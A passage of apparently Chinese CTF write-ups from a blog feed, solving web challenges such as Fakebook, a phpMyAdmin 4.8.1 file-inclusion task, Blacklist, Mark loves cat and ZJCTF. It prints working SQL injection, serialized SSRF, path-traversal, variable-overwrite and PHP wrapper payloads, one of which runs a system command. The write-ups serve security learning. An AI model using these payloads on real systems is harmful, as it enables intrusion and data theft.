<p>*<em>【</em>】CURLINFO_HTTP_CODE ：最后一个收到的HTTP代码。**<br><strong>curl_getinfo：以字符串形式返回它的值，因为设置了CURLINFO_HTTP_CODE，所以是返回的状态码。</strong></p>
<p><strong>如果状态码不是404，就返回exec的结果。</strong></p>
<p><img src="/2021/08/02/2021/buu/6/20200420141747970.png" alt="在这里插入图片描述"></p>
<p><strong>这里说明了传的参数是blog</strong></p>
<p>通过分析，我们知道了这题涉及反序列化和ssrf</p>
<h5 id="实操："><a href="#实操：" class="headerlink" title="实操："></a>实操：</h5><p>我先继续爆破</p>
<p><img src="/2021/08/02/2021/buu/6/image-20210803145941495.png" alt="image-20210803145941495"></p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><code class="hljs crystal">?no=-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span>/**/ <span class="hljs-title">select</span> 1,<span class="hljs-title">database</span>(),3,4<span class="hljs-comment">#</span></span><br></code></pre></td></tr></table></figure>

<p>得到数据库名：fakebook</p>
<p><img src="/2021/08/02/2021/buu/6/image-20210803151032215.png" alt="image-20210803151032215"></p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">?<span class="hljs-keyword">no</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;fakebook&#x27;</span>#<br></code></pre></td></tr></table></figure>

<p>得到表名：users</p>
<p><img src="/2021/08/02/2021/buu/6/image-20210803151215574.png" alt="image-20210803151215574"></p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">?<span class="hljs-keyword">no</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>#<br></code></pre></td></tr></table></figure>

<p>得到列名：no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</p>
<p><img src="/2021/08/02/2021/buu/6/image-20210803151357937.png" alt="image-20210803151357937"></p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><code class="hljs crystal">?no=-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span>/**/ <span class="hljs-title">select</span> 1,<span class="hljs-title">data</span>,3,4 <span class="hljs-title">from</span> <span class="hljs-title">users</span><span class="hljs-comment">#</span></span><br></code></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><code class="hljs crystal">?no=-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span> 1,<span class="hljs-title">group_concat</span>(<span class="hljs-title">no</span>,<span class="hljs-title">username</span>,<span class="hljs-title">passwd</span>,<span class="hljs-title">data</span>),3,4 <span class="hljs-title">from</span> <span class="hljs-title">fakebook</span>.<span class="hljs-title">users</span><span class="hljs-comment">#</span></span><br></code></pre></td></tr></table></figure>

<p>当试到data时，出现了我们想要的部分序列化数据格式</p>
<p>O:8:”UserInfo”:3:{s:4:”name”;s:3:”123”;s:3:”age”;i:1;s:4:”blog”;s:13:”<a href="http://www.baidu.com&quot;;}/">www.baidu.com&quot;;}</a>            </p>
<p>这时候回到源代码上</p>
<p>我们来一手反序列化操作：</p>
<p>注：文件路径是扫描到的。</p>
<p><img src="/2021/08/02/2021/buu/6/image-20210803153246831.png" alt="image-20210803153246831"></p>
<p>在本地www访问fakebook.php</p>
<p><img src="/2021/08/02/2021/buu/6/image-20210803153215829.png" alt="image-20210803153215829"></p>
<p>构造payload：</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><code class="hljs crystal">-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span>/**/ <span class="hljs-title">select</span> 1,2,3,&#x27;<span class="hljs-title">O</span>:8:&quot;<span class="hljs-title">UserInfo</span>&quot;:3:&#123;<span class="hljs-title">s</span>:4:&quot;<span class="hljs-title">name</span>&quot;;</span><span class="hljs-symbol">s:</span><span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;<span class="hljs-symbol">s:</span><span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;<span class="hljs-symbol">i:</span><span class="hljs-number">1</span>;<span class="hljs-symbol">s:</span><span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;<span class="hljs-symbol">s:</span><span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>

<p><img src="/2021/08/02/2021/buu/6/image-20210803153757132.png" alt="image-20210803153757132"></p>
<p><img src="/2021/08/02/2021/buu/6/image-20210803153814758.png" alt="image-20210803153814758"></p>
<p><img src="/2021/08/02/2021/buu/6/image-20210803153834055.png" alt="image-20210803153834055"></p>
<p>本文借鉴几个大佬博客：</p>
<p><a href="https://blog.csdn.net/qq_43622442/article/details/105633194">网鼎杯 2018]Fakebook_H9_dawn的博客-CSDN博客</a></p>
<p><a href="https://www.cnblogs.com/karsa/p/12652311.html">网鼎杯 2018]Fakebook - kar3a - 博客园 (cnblogs.com)</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1682583">网鼎杯2018-Fakebook - 云+社区 - 腾讯云 (tencent.com)</a></p>
]]></content>
      <categories>
        <category>CTF·sql</category>
      </categories>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>GWCTF 2019 我有一个数据库&amp;BJDCTF2020 The mystery of ip</title>
    <url>/2021/08/03/2021/buu/7/</url>
    <content><![CDATA[<h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p>打开页面，奇怪的乱码：</p>
<p><img src="/2021/08/03/2021/buu/7/image-20210803200638733.png" alt="image-20210803200638733"></p>
<p>找了一个乱码恢复页面：<a href="http://www.mytju.com/classcode/tools/messycoderecover.asp">乱码恢复 (mytju.com)</a></p>
<p><img src="/2021/08/03/2021/buu/7/image-20210803200740870.png" alt="image-20210803200740870"></p>
<p>在utf8格式下，只得到了无用信息：空的数据?我有一个数据库，但里面什么也没有~不信你找</p>
<p>在f12也不行后，我果断地拿起来神器——dirsearch！</p>
<p>一通扫描后果然有了眉目：</p>
<p><img src="/2021/08/03/2021/buu/7/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(356).png"></p>
<p><img src="/2021/08/03/2021/buu/7/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(357).png"></p>
<p>进入到<a href="http://e8451be4-2c39-421e-888a-2f04ad6a6de6.node4.buuoj.cn/phpmyadmin/index.php">e8451be4-2c39-421e-888a-2f04ad6a6de6.node4.buuoj.cn / mysql | phpMyAdmin 4.8.1</a></p>
<p><img src="/2021/08/03/2021/buu/7/image-20210803201030523.png" alt="image-20210803201030523"></p>
<p>熟悉的phpmyadmin数据库页面</p>
<p>但是到了这里我就懵了，因为没有足够权限好像查不到flag在哪</p>
<p>查看了wp</p>
<p>原来这个版本漏洞可以利用，PhpMyadmin后台文件包含漏洞</p>
<h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF/jxV/9/cEb5pShRgewJe/ttJn2gIlIyGF/bsgGmzcbsV+LmMK#rd">【首发】phpmyadmin4.8.1后台getshell (qq.com)</a></p>
<p><a href="https://www.jianshu.com/p/fb9c2ae16d09">cve-2018-12613-PhpMyadmin后台文件包含 - 简书 (jianshu.com)</a></p>
<p>​    index.php中</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><code class="hljs elixir"><span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;target&#x27;</span>];<br></code></pre></td></tr></table></figure>

<p>利用参数target</p>
<p>相关poc从参考文章中可知</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">target=db_datadict.php%<span class="hljs-number">253</span>f<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../<br></code></pre></td></tr></table></figure>

<p>经过尝试发现，读取时可以尽量多下几级（多../../）无影响，反之若少了则会报错</p>
<p>如下图</p>
<p><img src="/2021/08/03/2021/buu/7/image-20210803202146319.png" alt="image-20210803202146319"></p>
<p><img src="/2021/08/03/2021/buu/7/image-20210803202211040.png" alt="image-20210803202211040"></p>
<h5 id="Tips："><a href="#Tips：" class="headerlink" title="Tips："></a>Tips：</h5><p>另外还有一种解法，来自于上面的 ’首发‘ 链接</p>
<p>将一句话木马写入数据库，然后在文件包含漏洞使之成功访问，蚁剑连接。</p>
<p>参考博客：</p>
<p><a href="https://blog.csdn.net/SopRomeo/article/details/105536972">GWCTF 2019]我有一个数据库_SopRomeo的博客-CSDN博客</a></p>
<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p><img src="/2021/08/03/2021/buu/7/image-20210804210338451.png" alt="image-20210804210338451"></p>
<p>分别查看Flag、Hint</p>
<p><img src="/2021/08/03/2021/buu/7/image-20210804211511008.png" alt="image-20210804211511008"></p>
<p><img src="/2021/08/03/2021/buu/7/image-20210804210443630.png" alt="image-20210804210443630"></p>
<p>看了源码，没有什么可以利用信息</p>
<p>查看wp，知道了标题的ip有所指</p>
<p>我们的ip能够被获取，怀疑是与XFF有关</p>
<p>接着我们进入火狐验证想法</p>
<p>添加X-Forwarded-For:127.0.0.1</p>
<p><img src="/2021/08/03/2021/buu/7/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(366).png" alt="屏幕截图(366)"></p>
<p>看到回显显示：Your IP is : 127.0.0.1</p>
<p>说明了想法正确</p>
<p>利用模板注入</p>
<p><img src="/2021/08/03/2021/buu/7/image-20210804211235273.png" alt="image-20210804211235273"></p>
<p><img src="/2021/08/03/2021/buu/7/image-20210804211318879.png" alt="image-20210804211318879"></p>
<h5 id="知识点：SSTI模板注入"><a href="#知识点：SSTI模板注入" class="headerlink" title="知识点：SSTI模板注入"></a>知识点：SSTI模板注入</h5><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园 (cnblogs.com)</a></p>
<p><img src="/2021/08/03/2021/buu/7/1625650-20200216204049347-1844990197.png" alt="img"></p>
<p>模板注入涉及的是服务端Web应用使用模板引擎渲染用户请求的过程<br>服务端把用户输入的内容渲染成模板就可能造成SSTI(Server-Side Template Injection)</p>
<h3 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h3><h5 id="参考博客："><a href="#参考博客：" class="headerlink" title="参考博客："></a>参考博客：</h5><p><a href="https://blog.csdn.net/fightte/article/details/117003439">BJDCTF2020]The mystery of ip_fightte的博客-CSDN博客</a></p>
<p><a href="https://www.cnblogs.com/wangtanzhi/p/12318630.html">BJDCTF2020]The mystery of ip - 王叹之 - 博客园 (cnblogs.com)</a></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>GYCTF2020 Blacklist</title>
    <url>/2021/07/27/2021/buu/3/</url>
    <content><![CDATA[<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>打开靶机后，明显注入题。</p>
<p><img src="/2021/07/27/2021/buu/3/image-20210727204621570.png" alt="image-20210727204621570"></p>
<p>wp来源：<a href="https://www.cnblogs.com/20175211lyz/p/12356678.html">https://www.cnblogs.com/20175211lyz/p/12356678.html</a></p>
<h4 id="姿势-堆叠注入"><a href="#姿势-堆叠注入" class="headerlink" title="姿势-堆叠注入"></a>姿势-堆叠注入</h4><p>获取库名、表名、列名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">databases</span>;<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>;<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">columns</span> <span class="hljs-keyword">from</span> <span class="hljs-string">`table_name`</span>;<br></code></pre></td></tr></table></figure>

<p>试着查询了一下数据库名、表名和段名（<strong>这里没有用之前传统的联合查询，因为自己尝试查询之后发现后面会被正则表达式过滤</strong>）：</p>
<p>ps：不过我不太清楚为什么这里查询要 ‘ 加上 ；</p>
<p><img src="/2021/07/27/2021/buu/3/image-20210727204959368.png" alt="image-20210727204959368"></p>
<p><img src="/2021/07/27/2021/buu/3/image-20210727205248791.png" alt="image-20210727205248791"></p>
<p>出现了flag字样，然后用大佬的方法，</p>
<p>payload：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27;;<span class="hljs-keyword">handler</span> FlagHere <span class="hljs-keyword">open</span>;<span class="hljs-keyword">handler</span> FlagHere <span class="hljs-keyword">read</span> <span class="hljs-keyword">first</span>;<span class="hljs-keyword">handler</span> FlagHere <span class="hljs-keyword">close</span>;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>

<p>官方解释是：</p>
<p>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，</p>
<p>该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭</p>
<h4 id="Tip："><a href="#Tip：" class="headerlink" title="Tip："></a>Tip：</h4><p>本来应该还有一种姿势是修改表名，但是修改表名的关键字rename和alert都被正则ban掉，所以不能用</p>
<p>这题若是改造之前的强网杯2019随便注一题则可以用此方法。</p>
]]></content>
      <categories>
        <category>CTF·sql盲注</category>
      </categories>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF2020 Mark loves cat</title>
    <url>/2021/08/07/2021/buu/9/</url>
    <content><![CDATA[<h4 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h4><ol>
<li><h5 id="git源码泄露；"><a href="#git源码泄露；" class="headerlink" title=".git源码泄露；"></a>.git源码泄露；</h5></li>
<li><h5 id="导致变量覆盖漏洞（参考CTF之php变量覆盖漏洞）"><a href="#导致变量覆盖漏洞（参考CTF之php变量覆盖漏洞）" class="headerlink" title="$$导致变量覆盖漏洞（参考CTF之php变量覆盖漏洞）"></a><code>$$</code>导致变量覆盖漏洞（参考<a href="https://www.jianshu.com/p/a4d782e91852">CTF之php变量覆盖漏洞</a>）</h5></li>
</ol>
<h4 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h4><p>靶机启动：</p>
<p><img src="/2021/08/07/2021/buu/9/image-20210807153209853.png" alt="image-20210807153209853"></p>
<p>没有什么有用信息</p>
<p>扫描一下目录</p>
<p><img src="/2021/08/07/2021/buu/9/image-20210807102252828.png" alt="image-20210807102252828"></p>
<p><img src="/2021/08/07/2021/buu/9/image-20210807102702092.png" alt="image-20210807102702092"></p>
<p>（调低线程后）</p>
<p><img src="/2021/08/07/2021/buu/9/image-20210807110900544.png" alt="image-20210807110900544"></p>
<p>发现存在flag.php</p>
<p>我们再用GitHack下载下来。</p>
<p>得到两个文件index.php和flag.php</p>
<h5 id="index-php"><a href="#index-php" class="headerlink" title="index.php:"></a>index.php:</h5><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">&lt;?php<br>include <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-variable">$yds</span> = <span class="hljs-string">&quot;dog&quot;</span>;<br><span class="hljs-variable">$is</span> = <span class="hljs-string">&quot;cat&quot;</span>;<br><span class="hljs-variable">$handsome</span> = <span class="hljs-string">&#x27;yds&#x27;</span>;<br><br>foreach(<span class="hljs-variable">$_POST</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    $<span class="hljs-variable">$x</span> = <span class="hljs-variable">$y</span>;<br>&#125;<br><br>foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    $<span class="hljs-variable">$x</span> = $<span class="hljs-variable">$y</span>;<br>&#125;<br><br>foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$yds</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>  || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$is</span>);<br>&#125;<br><br>echo <span class="hljs-string">&quot;the flag is: &quot;</span>.<span class="hljs-variable">$flag</span>;<br></code></pre></td></tr></table></figure>

<h5 id="代码审计："><a href="#代码审计：" class="headerlink" title="代码审计："></a>代码审计：</h5><h6 id="摘抄部分"><a href="#摘抄部分" class="headerlink" title="摘抄部分"></a>摘抄部分</h6><p><img src="/2021/08/07/2021/buu/9/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjIyNDQy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>代码中的变量覆盖漏洞</strong></p>
<p><img src="/2021/08/07/2021/buu/9/202005042321468.png" alt="在这里插入图片描述"></p>
<p><strong>尝试第一个exit处</strong>，</p>
<p>看注释，键名不能有flag，而且又要键名为flag的键值等于其中一个键名，你又要我不存在，又要我存在，进不去这个判断，告辞</p>
<p><img src="/2021/08/07/2021/buu/9/1.jpg" alt="在这里插入图片描述"></p>
<p><strong>尝试第二个exit处</strong></p>
<p>我们想要通过单纯的post参数搞定它是不可能的，因为post处的变量覆盖是让它变成我们可控的值，所以搞不定。</p>
<p>所以可以通过单纯的get或者get+post搞定</p>
<p>可以看到这里是输出的$yds变量，那么我们就要通过变量覆盖达到$yds=$flag的效果</p>
<p>直接说答案比较好分析：get传参 yds=flag；<br>我们看看参数的传递流程：</p>
<p><img src="/2021/08/07/2021/buu/9/20200504233307150.png" alt="在这里插入图片描述"></p>
<p><strong>分析：</strong></p>
<p>在这个里面，首先是 <strong>$x=yds,$=fla</strong>g 。把它带进foreach里面，就变成了$yds=$flag 。</p>
<p>**$$x就相当于是$($x)**，这样就非常好理解变量覆盖漏洞了。</p>
<h5 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h5><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">yds</span>=flag<br></code></pre></td></tr></table></figure>

<p><img src="/2021/08/07/2021/buu/9/image-20210807155151631.png" alt="image-20210807155151631"></p>
<h5 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h5><p>这里是利用了exit($is)。</p>
<p>我们首先看看，要进入判断，执行exit($is)需要的条件，看注释。</p>
<p><img src="/2021/08/07/2021/buu/9/20200504233744435.png" alt="在这里插入图片描述"></p>
<p>那我们就先从post型flag=flag开始：</p>
<p>我们post的数据，会在这一步，把原来的$flag的值改变，因为$x=flag,$y=flag，然后带进去变成了$flag=flag。</p>
<p>over，原来的flag值被我们整没了，这条路不通：</p>
<p><img src="/2021/08/07/2021/buu/9/20200504233839775.png" alt="在这里插入图片描述"></p>
<p>我们试试get型的flag=flag：<br>（答案：is=flag&amp;flag=flag）</p>
<p><img src="/2021/08/07/2021/buu/9/20200504234208601.png" alt="在这里插入图片描述"></p>
<p>首先分析变量覆盖处：</p>
<p>首先是$x=is,$y=flag,带进去就变成了$is=$flag;<br>现在到了第二个参数,$x=flag,$y=flag，带进去变成$flag=$flag，自己变成自己，没啥影响，没有改变flag 的值，成功。</p>
<p><img src="/2021/08/07/2021/buu/9/image-20210807155750060.png" alt="image-20210807155750060"></p>
<h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>参考博客：</p>
<p> <a href="https://blog.csdn.net/jianpanliu/article/details/107028582">BJDCTF2020]Mark loves cat_qtL0ng的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/qq_43622442/article/details/105925473">BJDCTF2020]Mark loves cat (两种解法)（变量覆盖漏洞）_H9_dawn的博客-CSDN博客</a></p>
<p><a href="https://www.jianshu.com/p/a4d782e91852">CTF之php变量覆盖漏洞 - 简书 (jianshu.com)</a></p>
<p><a href="https://www.jianshu.com/p/a4d782e91852">CTF之php变量覆盖漏洞 - 简书 (jianshu.com)</a></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯2020玄武组-SSRFMe</title>
    <url>/2022/02/10/2022/2/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe/</url>
    <content><![CDATA[<h3 id="题记"><a href="#题记" class="headerlink" title="题记"></a>题记</h3><p> 记录一下这题</p>
<p> 知识点挺多的，题目的操作步骤感觉不难，vps的事情我也解决了，但最后是用学长的</p>
<p> 写入webshell的方法，这个经过查阅是redis的利用老办法了</p>
<p> 先慢慢理解里面的原理</p>
<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><img src="/2022/02/10/2022/2/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe/image-20220210203924383.png" alt="image-20220210203924383"></p>
]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF2020 ZJCTF，不过如此</title>
    <url>/2021/08/06/2021/buu/8/</url>
    <content><![CDATA[<h3 id="0x00-知识点"><a href="#0x00-知识点" class="headerlink" title="0x00 知识点"></a>0x00 知识点</h3><h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents:"></a>file_get_contents:</h4><p>file_get_contents函数把整个文件读入一个字符串中。</p>
<h5 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h5><p>file_get_contents(path,include_path,context,start,max_length)</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">path</td>
<td align="left">必需。规定要读取的文件。</td>
</tr>
<tr>
<td align="left">include_path</td>
<td align="left">可选。如果也想在 include_path 中搜寻文件的话，可以将该参数设为 “1”。</td>
</tr>
<tr>
<td align="left">context</td>
<td align="left">可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。若使用 null，则忽略。</td>
</tr>
<tr>
<td align="left">start</td>
<td align="left">可选。规定在文件中开始读取的位置。该参数是 PHP 5.1 新加的。</td>
</tr>
<tr>
<td align="left">max_length</td>
<td align="left">可选。规定读取的字节数。该参数是 PHP 5.1 新加的。</td>
</tr>
</tbody></table>
<h5 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h5><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&quot;test.txt&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript">This <span class="hljs-keyword">is</span> a test <span class="hljs-built_in">file</span> <span class="hljs-keyword">with</span> test <span class="hljs-built_in">text</span>.<br></code></pre></td></tr></table></figure>

<h4 id="text-plain"><a href="#text-plain" class="headerlink" title="text/plain"></a>text/plain</h4><p><a href="https://www.cnblogs.com/soundcode/p/4572251.html">text/html与text/plain有什么区别？ - 左正 - 博客园 (cnblogs.com)</a></p>
<p>text/plain的意思是将文件设置为纯文本的形式，浏览器在获取到这种文件时并不会对其进行处理。</p>
<h4 id="PHP伪协议中的data-协议"><a href="#PHP伪协议中的data-协议" class="headerlink" title="PHP伪协议中的data://协议"></a>PHP伪协议中的data://协议</h4><p>摘抄于：<a href="https://blog.csdn.net/qq_46091464/article/details/106665358">文件包含漏洞之PHP伪协议中的data://的那些事~_Firebasky的博客-CSDN博客</a></p>
<h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//include.php</span><br><span class="hljs-meta">&lt;?php</span><br>    @$file  = $_GET[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    @<span class="hljs-keyword">include</span>($file);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>payload1：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">?file=data:<span class="hljs-comment">//text/plain,<span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>

<p><strong>无法使用</strong></p>
<p>payload2：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">?file=data:<span class="hljs-regexp">//</span>text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+<br></code></pre></td></tr></table></figure>

<p><strong>无法使用</strong></p>
<p>payload3：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">?file=data:<span class="hljs-regexp">//</span>text<span class="hljs-regexp">/plain;base64,*PD9waHAgc3lzdGVtKCJkaXIiKTs/</span>Pg==*<br></code></pre></td></tr></table></figure>

<p><strong>可以使用</strong></p>
<p>总结：<br>通过实验发现这个可能是编码的问题因为<?php phpinfo();?>在编成base64的时候出现了+。而浏览器不认识+号。所以解决方法</p>
<p>1.不写后面的?&gt; 因为PHP里面其实不需要写后面的 前面的；号就已经说明结束了。如果没有；号就必须写?&gt;作为结束。</p>
<p>2.添加空格改变base64编码。</p>
<p>3.将+号换成%2b</p>
<p>所以其实不需要通过base64编码来实现！！！<br>将<?php phpinfo();?>改变成url编码。这样浏览器可以识别！<br><img src="/2021/08/06/2021/buu/8/20200610150733928.png" alt="在这里插入图片描述"></p>
<h4 id="php-filter协议"><a href="#php-filter协议" class="headerlink" title="php://filter协议"></a>php://filter协议</h4><p>摘抄于：</p>
<p><a href="https://blog.csdn.net/destiny1507/article/details/82347371">php://filter 的使用_hhh-CSDN博客</a></p>
<p>​    php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取；</p>
<p>​    根据名字，filter，可以很容易想到这个协议可以用来过滤一些东西；</p>
<p>构造：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>recource=index.php<br></code></pre></td></tr></table></figure>

<p>​    这句话的意思是我们用base64编码的方式来读文件index.php；</p>
<p>​    这时页面会显示出源文件index.php经过base64编码后的内容，然后经过base64解码就可以看到flag；</p>
<p><strong>总之呢，php://filter协议有一下几个应用：</strong></p>
<p>1、利用base64获得源码</p>
<p>2、通过读写编码实行绕过操作</p>
<p><strong>问：为什么需要用base64才可以看到源码 如果本地源码是明文的话那是不是不用过滤器</strong>？</p>
<p>​    include一个文件中有php代码会进行php解析，如果是明文，则会直接返回明文。用了过滤器，如果是php文件就不会解析，就可以拿到php文件的源码了</p>
<p>​    先把要读取的内容经过base64编码然后才能显示出来，之后我们再经过解码就可以是可读的了</p>
<h4 id="preg-replace（）函数"><a href="#preg-replace（）函数" class="headerlink" title="preg_replace（）函数"></a>preg_replace（）函数</h4><p>文章：<a href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行 - 先知社区 (aliyun.com)</a></p>
<h3 id="0x01-解题"><a href="#0x01-解题" class="headerlink" title="0x01 解题"></a>0x01 解题</h3><p><img src="/2021/08/06/2021/buu/8/image-20210806084045764.png" alt="image-20210806084045764"></p>
<p>代码内容：</p>
